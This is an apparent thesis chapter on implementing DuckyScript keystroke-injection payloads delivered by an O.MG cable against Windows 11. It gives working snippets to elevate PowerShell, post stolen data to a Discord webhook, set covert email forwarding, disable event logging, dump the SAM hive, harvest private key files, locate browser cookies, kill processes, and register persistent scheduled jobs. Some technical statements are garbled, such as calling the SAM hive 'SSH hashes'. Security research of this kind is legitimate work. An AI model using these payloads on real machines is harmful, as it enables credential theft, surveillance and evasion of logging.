\chapter{Implementation} \label{Implementation}

\section{Attack}

The first part of this chapter will describe the implementation of the payloads as outlined in Section \ref{methodology}. It introduces the reader to the attacker's point of few, which prerequisites their attacks have, what steps they have to take to develop them, and how exactly they can be implemented. 


\subsection{Prerequisites}

The payloads presented in this chapter have the following prerequisites:
\begin{enumerate}
    \item Undisturbed input: while the payload is executing there may be no other HID input, especially no keypresses. A keypress will almost certainly throw off the execution of the payload, as will clicking, and especially switching focus to another window.
    \item Windows: these payloads were written for Windows 11 with Powershell, it is not guaranteed that they will work on any other system.
    \item Unlocked state: the payloads in this paper assume that the target computer is not locked. However, the payload can include a few lines to unlock the computer, if the password is known. If it is not known, it can be found out if the O.MG cable is used to keylog an external keyboard on which the password is typed. 
    \item Known Keyboard language: These Payloads are written for a DE-CH layout but can be adjusted for any other layout. It is crucial that the layout set in the payload (default US) is the same as the layout language of the victim. If it is not known, the keymapper functionality of the keyboard can be used to determine it. 
\end{enumerate}

\subsection{Basics}

Many payloads contain one or more common basic building blocks, namely opening application (mostly Powershell), getting admin rights, sending some data or how to close and application to cover up tracks.  \\
This section will give a short overview over those use cases and how they can be implemented.


\subsubsection{Opening an application}

On Windows, there are several ways to open an application. This can be rather complicated, i.e. finding the executable in the files and running it, or simply searching it in the Windows search menu and accessing it from there. These are some of the ways in which applications can be opened;
\begin{enumerate}
    \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the Windows run menu, which can be opened with the \textit{Windows key + r}. Here the name of the application can be entered, i.e. \textit{powershell} or \textit{powershell.exe}. Additionally, it can work with parameters, for example \textit{--incognito} can be used in combination with \textit{brave.exe} to open a private tab of the Brave browser. Or another example is opening Powershell with window style hidden:
    \begin{lstlisting}
    STRING GUI r
    STRINGLN powershell.exe -windowstyle hidden
    \end{lstlisting}
    \item Many Windows system applications can be accessed through the Windows power menu, which is accessed with \textit{Windows key + x}. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As illustration the following implementation uses this approach to open Task Manager:
    \begin{lstlisting}
    STRING GUI x
    STRING t
    \end{lstlisting}
    \item Another Windows menu can be used to open applications; the Windows run menu. Simply pressing the Windows key will open it, and autofocus the cursor to the search bar, such that the application name can be typed. It is advisable to type out the entire name of the desired application to make sure the correct version is selected (i.e. '\textit{Outlook (new)}' instead of just '\textit{Outlook}' to ensure that the new and not the old version is opened). It is also important to give the system some time to load the search results and not program the enter key immediately after starting the search.
    \begin{lstlisting}
    STRING GUI
    STRING Microsoft Teams (work or school)
    DELAY 100
    ENTER
    \end{lstlisting}
    \item Lastly, Windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, \textit{ctrl + shift + escape} to open task manager. Application on the toolbar can similarly be opened through \textit{Windows key +} their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run an payload that looks like this to open it:
    \begin{lstlisting}
    GUI + 1
    \end{lstlisting}
\end{enumerate}

In general it holds, as always, that the best choice is the fastest and most reliable one, which would be the run Windows option or the default shortcuts. Using the search menu creates time overhead and is a very obvious way of searching since the menu takes up such a big part of the screen. 

\subsubsection{Admin Rights}

Acquiring admin rights is mainly an issue when trying to execute admin level command in Powershell. For these operations, Powershell should be run as administrator. \\
The most straight forward approach for this is to use the power user menu and selecting Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to ask if the application should be allowed to make changes to the device. 'Yes' can be selected and Powershell will open run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
\begin{lstlisting}
GUI x
DELAY 100
STRINGLN a
DELAY 600
LEFTARROW
DELAY 50
ENTER
\end{lstlisting}

Another option is to search Powershell in the search menu and navigating to the option '\textit{Run as Administrator}' \\
\begin{lstlisting}
GUI
STRING Powershell
DELAY 300
RIGHTARROW
DELAY 50
DOWNARROW
ENTER
\end{lstlisting}

\subsubsection{Closing applications}

In Windows exists a little menu for every open window. It can be accessed by right clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} key on the keyboard simultaneously. \\
The menu features the options '\textit{\underline{R}estore}', '\textit{\underline{M}ove}', '\textit{\underline{S}ize}', '\textit{Mi\underline{n}imize}', '\textit{Ma\underline{x}imize}', and '\textit{\underline{C}lose}'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or closing them after running a payload to cover one's tracks.
\begin{lstlisting}
ALT SPACE
DELAY 50
STRING c
\end{lstlisting}
It is important to keep in mind, that the name of these options and with that their shortcuts are dependent on the system language. \\
Another common shortcut for closing focused windows is \textit{Alt F4}.
\begin{lstlisting}
ALT F4
\end{lstlisting}
\\

An option specifically for closing Powershell windows is the shell keyword '\textit{exit}' :
\begin{lstlisting}
STRINGLN exit
\end{lstlisting}


\subsubsection{Sending Recon to a Server}

When gathering some information form the victim's laptop, the question arises how this information can be forwarded to the attacker. While there is a myriad for possibilities for this, ranging from physical attraction, to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
One option to send out information is to send it to an already established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this, is that it looks very iconspicuous and will probably pass through firewalls.\\
One example of sending an Extensible Markup Language (XML) object to a discord webhook given the webhook address and the content for the XML object:
\begin{lstlisting}
STRING $xmlObject = [xml]$xmlContent
ENTER
STRING $Payload = @{xml = $xmlObject}
ENTER
STRING $Json = @{content = $Payload | ConvertTo-Json } | ConvertTo-Json	
ENTER
STRING Invoke-RestMethod -Uri $Webhook -Method Post -Body $Json -ContentType 'application/json'
ENTER
\end{lstlisting}

This approach would also be possible with a custom server by replacing the webhook with the server address.



\subsection{Payloads}

\subsubsection{Register Email Forwarding}

This payload is UI based, since it is using outlook. The difficulty for using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example for how tricky it can be to use the UI approach; every menu option that is selected, prompts a small load delay that has to be factor into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded to. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, in order to mask their steps, the attacker should restart outlook to close the message such that the victim has less chance of discovering the attack. \\
To illustrate this attack the following lines show some of the navigational steps:


\begin{lstlisting}
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
ENTER
DELAY 2000
TAB
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
\end{lstlisting}

Of course, the delay (in milliseconds) can be adjusted depending on the expected speed of the target machine. 




\subsubsection{Disable Windows Event Logging}

This thesis presents two approaches to Windows event logging.

\textbf{UI} 

This implementation opens the Windows Event log application through the Windows Run window and navigates to the correct pane where it disables the logging.
This approach mimics the action of a UI focused user. As explained in Section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:

\begin{lstlisting}
DELAY 1000
TAB
DELAY 2000
STRING m
DELAY 2000
TAB
DELAY 2000
ENTER
DELAY 6000
TAB
DELAY 2000
TAB
DELAY 2000
TAB
DELAY 2000
TAB
DELAY 2000
\end{lstlisting}

\textbf{CLI}

Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in Section \ref{methodology} \\

Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:

\begin{lstlisting}
STRINGLN Stop-Service -Name "eventlog"
DELAY 200
STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
DELAY 300
STRINGLN exit
\end{lstlisting}


\subsubsection{Extract SSH hashes}

Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the Windows system by storing it in a file and the sending that file to a command server. \\
Once admin privileges on a terminal have been secured, this is a straight forward process. 


 \begin{lstlisting} 
 STRINGLN reg save HKLM\SAM C:\sam.hiv
 \end{lstlisting}

\subsubsection{Extract Private Key Files}

File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 

\begin{lstlisting}
DUCKY_LANG DE_CH
DELAY 50
GUI r
DELAY 200
STRINGLN powershell.exe
DELAY 2500
STRINGLN $entryPoint = "your/path"
DELAY 200
STRINGLN $extensions = @(".key", ".pgp", ".gpg", ".ppk", ".p12", ".pem", ".pfx", ".cer", ".p7b", ".asc")
DELAY 200
STRINGLN Get-ChildItem -Path $entryPoint -Recurse | ForEach-Object {
DELAY 200
STRINGLN     if ($_.PSIsContainer) {
DELAY 200
STRINGLN         return
DELAY 200
STRINGLN     }
DELAY 200
STRINGLN     if ($extensions -contains $_.Extension) {
DELAY 200
            *insert code to send file to desired location*
DELAY 200
STRINGLN     }
DELAY 200
STRINGLN }
DELAY 50
ENTER
DELAY 200
STRINGLN exit
\end{lstlisting}


\subsubsection{Steal Web Session Cookies}

A client's default browser can be extracted via Powershell using only one line:
\begin{lstlisting}
STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
\end{lstlisting}

After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is Firefox, they could start a terminal, navigate to the default directory for Firefox cookies and extract that file.

\begin{lstlisting}
STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
\end{lstlisting}

The same approach can be used for chrome, the difference is in the file path.

\begin{lstlisting}
STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
\end{lstlisting}

\subsubsection{Iteratively End Processes}

Finding and ending processes on Windows can be done with Powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
This is an excerpt of the whitelist mode;

\begin{lstlisting}
STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
DELAY 5
STRINGLN while("true"){
DELAY 5
STRINGLN $runningProcesses = Get-Process | Select-Object -ExpandProperty Name | select -Unique
DELAY 5
STRINGLN foreach ($process in $runningProcesses) {
DELAY 5
STRINGLN if ($criticalProcessesWhitelist -contains $process) {
DELAY 5
STRINGLN Stop-Process -Name $process
DELAY 5
STRINGLN Write-Output "process $process deleted"
DELAY 5
STRINGLN }
DELAY 5
STRINGLN }
DELAY 5
STRINGLN Start-Sleep -Seconds 1.5
DELAY 5
STRINGLN }
\end{lstlisting}

The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention drawing error messages. In order for this payload to run, it is essential that the name in the white- or blacklist match exactly what the process name is that is returned by the Get-Process Powershell function. 



\subsubsection{Schedule Processes}

Windows Processes can be scheduled via Powershell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to chose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
For the purpose of this demonstration, logon is used. \\
Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery' , -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\


\begin{lstlisting}
DELAY 2000
STRINGLN $trigger = New-JobTrigger -AtLogon
DELAY 200
STRINGLN $options = New-ScheduledJobOption -StartIfOnBattery
DELAY 200
STRINGLN Register-ScheduledJob -Name ProcessJob -ScriptBlock {*enter script*} -Trigger $trigger -ScheduledJobOption $options
DELAY 200
\end{lstlisting}
